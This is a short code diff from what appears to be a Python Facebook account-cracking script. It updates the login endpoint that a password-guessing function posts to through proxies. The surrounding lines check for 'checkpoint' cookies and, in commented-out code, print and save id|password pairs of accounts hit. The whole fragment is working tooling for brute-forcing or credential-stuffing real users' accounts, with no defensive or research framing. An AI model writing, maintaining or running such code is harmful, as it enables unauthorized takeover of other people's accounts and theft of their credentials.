@@ -424,7 +424,7 @@ def metodh1(idf,pwv):
 'is_smart_lock': False,
 'bi_xrwh': 0
 }
-			po = ses.post('https://m.facebook.com/login/device-based/regular/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				#print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')
 				#open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
